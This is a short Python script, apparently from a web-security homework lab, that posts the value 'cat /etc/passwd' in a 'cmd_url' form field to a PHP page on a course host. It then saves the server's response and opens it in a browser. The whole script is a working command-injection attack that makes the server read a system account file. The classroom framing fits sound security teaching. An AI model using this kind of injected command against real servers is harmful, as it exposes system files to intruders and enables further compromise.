import requests, webbrowser
url = 'http://www.wsb.com/Homework3/case06.php'
data = {'cmd_url' : 'cat /etc/passwd'}

r = requests.post(url, data)

with open('target.html', 'w') as f:
        f.write(r.text)

new = 2
webbrowser.open('target.html', new=new)